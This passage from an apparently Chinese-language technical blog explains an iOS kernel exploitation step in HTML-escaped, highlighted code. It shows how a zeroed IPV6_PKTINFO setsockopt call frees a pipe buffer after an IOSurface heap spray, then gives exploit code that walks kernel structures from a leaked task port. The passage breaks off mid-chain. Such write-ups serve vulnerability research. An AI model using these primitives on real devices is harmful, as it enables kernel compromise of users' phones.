&lt;span class=&quot;n&quot;&gt;read&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;fds&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;0&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;],&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;pipebuf&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;mh&quot;&gt;0x10000&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;);&lt;/span&gt; &lt;span class=&quot;c1&quot;&gt;// do read() to reset buffer position&lt;/span&gt;
&lt;span class=&quot;n&quot;&gt;write&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;fds&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;1&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;],&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;pipebuf&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;8&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;);&lt;/span&gt; &lt;span class=&quot;c1&quot;&gt;// write 8 bytes so later we can read the first 8 bytes&lt;/span&gt;
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;当我们调用函数&lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;setsockopt()&lt;/code&gt;时，会调用到函数&lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;ip6_setpktopt()&lt;/code&gt;&lt;/p&gt;

&lt;div class=&quot;language-c highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;n&quot;&gt;setsockopt&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;sock&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;IPPROTO_IPV6&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;IPV6_PKTINFO&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;pktinfo&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;k&quot;&gt;sizeof&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;*&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;pktinfo&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;));&lt;/span&gt;
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;当选项名为&lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;IPV6_PKTINFO&lt;/code&gt;时，我们会发现一个逻辑：如果&lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;pktinfo-&amp;gt;ipi6_ifindex&lt;/code&gt;为&lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;0&lt;/code&gt;且&lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;&amp;amp;pktinfo-&amp;gt;ipi6_addr&lt;/code&gt;开始的&lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;12&lt;/code&gt;个字节的数据也都是&lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;0&lt;/code&gt;，就会调用函数&lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;ip6_clearpktopts()&lt;/code&gt;释放掉当前的&lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;ip6_pktopts-&amp;gt;in6_pktinfo&lt;/code&gt;，这个判断条件简化一下就是整个结构体数据都是&lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;0&lt;/code&gt;就会被释放&lt;/p&gt;

&lt;div class=&quot;language-c highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;n&quot;&gt;define&lt;/span&gt;	&lt;span class=&quot;nf&quot;&gt;IN6_IS_ADDR_UNSPECIFIED&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;a&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;	\
	&lt;span class=&quot;p&quot;&gt;((&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;*&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;k&quot;&gt;const&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;__uint32_t&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;*&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)(&lt;/span&gt;&lt;span class=&quot;k&quot;&gt;const&lt;/span&gt; &lt;span class=&quot;kt&quot;&gt;void&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;*&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)(&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;&amp;amp;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;a&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;-&amp;gt;&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;s6_addr&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;0&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;])&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;==&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;0&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;&amp;amp;&amp;amp;&lt;/span&gt; \
	&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;*&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;k&quot;&gt;const&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;__uint32_t&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;*&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)(&lt;/span&gt;&lt;span class=&quot;k&quot;&gt;const&lt;/span&gt; &lt;span class=&quot;kt&quot;&gt;void&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;*&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)(&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;&amp;amp;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;a&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;-&amp;gt;&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;s6_addr&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;4&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;])&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;==&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;0&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;&amp;amp;&amp;amp;&lt;/span&gt; \
	&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;*&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;k&quot;&gt;const&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;__uint32_t&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;*&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)(&lt;/span&gt;&lt;span class=&quot;k&quot;&gt;const&lt;/span&gt; &lt;span class=&quot;kt&quot;&gt;void&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;*&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)(&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;&amp;amp;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;a&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;-&amp;gt;&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;s6_addr&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;8&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;])&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;==&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;0&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;&amp;amp;&amp;amp;&lt;/span&gt; \
	&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;*&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;k&quot;&gt;const&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;__uint32_t&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;*&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)(&lt;/span&gt;&lt;span class=&quot;k&quot;&gt;const&lt;/span&gt; &lt;span class=&quot;kt&quot;&gt;void&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;*&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)(&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;&amp;amp;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;a&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;-&amp;gt;&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;s6_addr&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;12&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;])&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;==&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;0&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;))&lt;/span&gt;

&lt;span class=&quot;k&quot;&gt;static&lt;/span&gt; &lt;span class=&quot;kt&quot;&gt;int&lt;/span&gt;
&lt;span class=&quot;n&quot;&gt;ip6_setpktopt&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;kt&quot;&gt;int&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;optname&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;u_char&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;*&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;buf&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;kt&quot;&gt;int&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;len&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;k&quot;&gt;struct&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;ip6_pktopts&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;*&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;opt&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt;
    &lt;span class=&quot;kt&quot;&gt;int&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;sticky&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;kt&quot;&gt;int&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;cmsg&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;kt&quot;&gt;int&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;uproto&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;
&lt;span class=&quot;p&quot;&gt;{&lt;/span&gt;
	&lt;span class=&quot;kt&quot;&gt;int&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;minmtupolicy&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;preftemp&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
	&lt;span class=&quot;kt&quot;&gt;int&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;error&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
	&lt;span class=&quot;n&quot;&gt;boolean_t&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;capture_exthdrstat_out&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;FALSE&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;

	&lt;span class=&quot;k&quot;&gt;switch&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;optname&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;{&lt;/span&gt;
	&lt;span class=&quot;k&quot;&gt;case&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;IPV6_2292PKTINFO&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;:&lt;/span&gt;
	&lt;span class=&quot;k&quot;&gt;case&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;IPV6_PKTINFO&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;:&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;{&lt;/span&gt;
		&lt;span class=&quot;k&quot;&gt;struct&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;ifnet&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;*&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;ifp&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;nb&quot;&gt;NULL&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
		&lt;span class=&quot;k&quot;&gt;struct&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;in6_pktinfo&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;*&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;pktinfo&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;

		&lt;span class=&quot;k&quot;&gt;if&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;len&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;!=&lt;/span&gt; &lt;span class=&quot;k&quot;&gt;sizeof&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;k&quot;&gt;struct&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;in6_pktinfo&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;))&lt;/span&gt;
			&lt;span class=&quot;k&quot;&gt;return&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;EINVAL&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;);&lt;/span&gt;

		&lt;span class=&quot;n&quot;&gt;pktinfo&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;k&quot;&gt;struct&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;in6_pktinfo&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;*&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)(&lt;/span&gt;&lt;span class=&quot;kt&quot;&gt;void&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;*&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;buf&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;

		&lt;span class=&quot;k&quot;&gt;if&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;optname&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;==&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;IPV6_PKTINFO&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;&amp;amp;&amp;amp;&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;opt&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;-&amp;gt;&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;ip6po_pktinfo&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;&amp;amp;&amp;amp;&lt;/span&gt;
		    &lt;span class=&quot;n&quot;&gt;pktinfo&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;-&amp;gt;&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;ipi6_ifindex&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;==&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;0&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;&amp;amp;&amp;amp;&lt;/span&gt;
		    &lt;span class=&quot;n&quot;&gt;IN6_IS_ADDR_UNSPECIFIED&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;&amp;amp;&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;pktinfo&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;-&amp;gt;&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;ipi6_addr&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;))&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;{&lt;/span&gt;
			&lt;span class=&quot;n&quot;&gt;ip6_clearpktopts&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;opt&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;optname&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;);&lt;/span&gt;
			&lt;span class=&quot;k&quot;&gt;break&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
		&lt;span class=&quot;p&quot;&gt;}&lt;/span&gt;
		
		&lt;span class=&quot;p&quot;&gt;...&lt;/span&gt;
	&lt;span class=&quot;p&quot;&gt;}&lt;/span&gt;
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;函数&lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;ip6_clearpktopts()&lt;/code&gt;调用&lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;FREE()&lt;/code&gt;来执行释放缓冲区操作，这里面涉及到了堆的分配释放问题，由于并不是本文分析的重点，不过多深入&lt;/p&gt;

&lt;div class=&quot;language-c highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;cp&quot;&gt;#define R_Free(p) FREE((caddr_t)p, M_RTABLE);
#define FREE(addr, type) \
	_FREE((void *)addr, type)
#define FREE(addr, type) \
	_FREE((void *)addr, type)
#define free _FREE
#define FREE(addr, type) _free((void *)addr, type, __FILE__, __LINE__)
&lt;/span&gt;
&lt;span class=&quot;kt&quot;&gt;void&lt;/span&gt;
&lt;span class=&quot;nf&quot;&gt;ip6_clearpktopts&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;k&quot;&gt;struct&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;ip6_pktopts&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;*&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;pktopt&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;kt&quot;&gt;int&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;optname&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;
&lt;span class=&quot;p&quot;&gt;{&lt;/span&gt;
	&lt;span class=&quot;k&quot;&gt;if&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;optname&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;==&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;-&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;1&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;||&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;optname&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;==&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;IPV6_PKTINFO&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;{&lt;/span&gt;
		&lt;span class=&quot;k&quot;&gt;if&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;pktopt&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;-&amp;gt;&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;ip6po_pktinfo&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;
			&lt;span class=&quot;n&quot;&gt;FREE&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;pktopt&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;-&amp;gt;&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;ip6po_pktinfo&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;M_IP6OPT&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;);&lt;/span&gt;
		&lt;span class=&quot;n&quot;&gt;pktopt&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;-&amp;gt;&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;ip6po_pktinfo&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;nb&quot;&gt;NULL&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
	&lt;span class=&quot;p&quot;&gt;}&lt;/span&gt;
	
	&lt;span class=&quot;p&quot;&gt;...&lt;/span&gt;
&lt;span class=&quot;p&quot;&gt;}&lt;/span&gt;
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;我们现在想要实现释放Pipe缓冲区只需要先获取它的地址，然后IOSurface堆喷使用这个Pipe缓冲区地址构造的数据，通过调用函数&lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;setsockopt()&lt;/code&gt;设置整个&lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;in6_pktinfo&lt;/code&gt;结构体数据为&lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;0&lt;/code&gt;就可以把这个Pipe缓冲区给释放掉&lt;/p&gt;

&lt;p&gt;根据我们泄露出来的&lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;Task Port&lt;/code&gt;获取Pipe缓冲区地址，注意不同的系统版本偏移需要有所调整&lt;/p&gt;

&lt;div class=&quot;language-c highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;kt&quot;&gt;uint64_t&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;task&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;rk64_check&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;self_port_addr&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;+&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;koffset&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;KSTRUCT_OFFSET_IPC_PORT_IP_KOBJECT&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;));&lt;/span&gt;
&lt;span class=&quot;kt&quot;&gt;uint64_t&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;proc&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;rk64_check&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;task&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;+&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;koffset&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;KSTRUCT_OFFSET_TASK_BSD_INFO&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;));&lt;/span&gt;
&lt;span class=&quot;kt&quot;&gt;uint64_t&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;p_fd&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;rk64_check&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;proc&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;+&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;koffset&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;KSTRUCT_OFFSET_PROC_P_FD&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;));&lt;/span&gt;
&lt;span class=&quot;kt&quot;&gt;uint64_t&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;fd_ofiles&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;rk64_check&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;p_fd&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;+&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;koffset&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;KSTRUCT_OFFSET_FILEDESC_FD_OFILES&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;));&lt;/span&gt;
&lt;span class=&quot;kt&quot;&gt;uint64_t&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;fproc&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;rk64_check&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;fd_ofiles&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;+&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;fds&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;0&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;]&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;*&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;8&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;);&lt;/span&gt;
&lt;span class=&quot;kt&quot;&gt;uint64_t&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;f_fglob&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;rk64_check&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;fproc&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;+&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;koffset&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;KSTRUCT_OFFSET_FILEPROC_F_FGLOB&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;));&lt;/span&gt;
